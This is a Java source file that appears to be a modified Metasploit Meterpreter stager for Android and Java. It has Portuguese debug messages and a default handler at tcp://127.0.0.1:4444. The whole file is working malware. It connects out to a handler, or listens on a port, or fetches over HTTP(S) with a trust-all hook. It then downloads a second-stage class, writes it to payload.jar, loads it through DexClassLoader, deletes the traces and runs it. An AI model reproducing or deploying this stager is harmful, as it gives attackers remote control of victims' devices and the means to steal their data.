package com.capture;


import android.content.Context;
import dalvik.system.DexClassLoader;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.TimeUnit;

public class Payload {
    public static final String CERT_HASH = "WWWW                                        ";
    public static final String TIMEOUTS = "TTTT604800-300-3600-10                         ";
    public static final String URL = "ZZZZtcp://127.0.0.1:4444	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ";
    public static long comm_timeout;
    private static String[] parameters;
    public static long retry_total;
    public static long retry_wait;
    public static long session_expiry;
    private static boolean isConnected = false;

    public static void start(Object р0) {
    }

    static class C00001 extends Thread {
        C00001() {
        }

        public void run() {
            Payload.main(null);
        }
    }

    public static void start(Context context) {
        startInPath(context.getFilesDir().toString());
    }

    public static void startAsync() {
        new C00001().start();
    }

    public static void startInPath(String path) {
        parameters = new String[]{path};
        startAsync();
    }

    public static void main(String[] args) {
        if (args != null) {
            parameters = new String[]{new File(".").getAbsolutePath()};
        }
        String[] timeouts = TIMEOUTS.substring(4).trim().split("-");
        try {
            long sessionExpiry = Integer.parseInt(timeouts[0]);
            long commTimeout = Integer.parseInt(timeouts[1]);
            long retryTotal = Integer.parseInt(timeouts[2]);
            long retryWait = Integer.parseInt(timeouts[3]);
            long payloadStart = System.currentTimeMillis();
            session_expiry = TimeUnit.SECONDS.toMillis(sessionExpiry) + payloadStart;
            comm_timeout = TimeUnit.SECONDS.toMillis(commTimeout);
            retry_total = TimeUnit.SECONDS.toMillis(retryTotal);
            retry_wait = TimeUnit.SECONDS.toMillis(retryWait);
            String url = URL.substring(4).trim();

            int attempt = 0;
            while (System.currentTimeMillis() < retry_total + payloadStart && System.currentTimeMillis() < session_expiry) {
                if (!isConnected) {
                    try {
                        System.out.println("Tentando conectar em: " + url);
                        if (url.startsWith("tcp")) {
                            runStagefromTCP(url);
                        } else {
                            runStageFromHTTP(url);
                        }
                        isConnected = true;
                        System.out.println("Conexão estabelecida!");
                    } catch (Exception e) {
                        isConnected = false;
                        e.printStackTrace();
                        attempt++;
                        System.out.println("Tentativa " + attempt + " falhou. Aguardando...");
                        Thread.sleep(retry_wait);
                    }
                }
                if (isConnected) {
                    Thread.sleep(1000); // Verifica se a conexão ainda está ativa
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void runStageFromHTTP(String url) throws Exception {
        InputStream inStream;
        if (url.startsWith("https")) {
            URLConnection uc = new URL(url).openConnection();
            Class.forName("com.metasploit.stage.PayloadTrustManager")
                    .getMethod("useFor", URLConnection.class)
                    .invoke(null, uc);
            inStream = uc.getInputStream();
        } else {
            inStream = new URL(url).openStream();
        }
        readAndRunStage(new DataInputStream(inStream), new ByteArrayOutputStream(), parameters);
    }

    private static void runStagefromTCP(String url) throws Exception {
        Socket sock = null;
        String[] parts = url.split(":");
        int port = Integer.parseInt(parts[2]);
        String host = parts[1].split("/")[2];

        try {
            if (host.equals("")) {
                ServerSocket server = new ServerSocket(port);
                sock = server.accept();
                server.close();
            } else {
                sock = new Socket(host, port);
            }

            if (sock != null) {
                sock.setSoTimeout(1000);
                isConnected = true;
                readAndRunStage(new DataInputStream(sock.getInputStream()), new DataOutputStream(sock.getOutputStream()), parameters);
            }
        } catch (Exception e) {
            isConnected = false;
            throw e;
        } finally {
            if (sock != null) {
                sock.close();
            }
        }
    }

    private static void readAndRunStage(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
        String path = parameters[0];
        String filePath = path + File.separatorChar + "payload.jar";
        String dexPath = path + File.separatorChar + "payload.dex";

        boolean shouldRestart = true;

        while (shouldRestart) {
            byte[] core = new byte[in.readInt()];
            in.readFully(core);
            String classFile = new String(core);
            core = new byte[in.readInt()];
            in.readFully(core);
            File file = new File(filePath);
            if (!file.exists()) {
                file.createNewFile();
            }
            FileOutputStream fop = new FileOutputStream(file);
            fop.write(core);
            fop.flush();
            fop.close();
            Class<?> myClass = new DexClassLoader(filePath, path, path, Payload.class.getClassLoader()).loadClass(classFile);
            Object stage = myClass.newInstance();
            file.delete();
            new File(dexPath).delete();
            myClass.getMethod("start", DataInputStream.class, OutputStream.class, String[].class)
                    .invoke(stage, in, out, parameters);

            shouldRestart = false;
        }

        System.exit(0);
    }
}
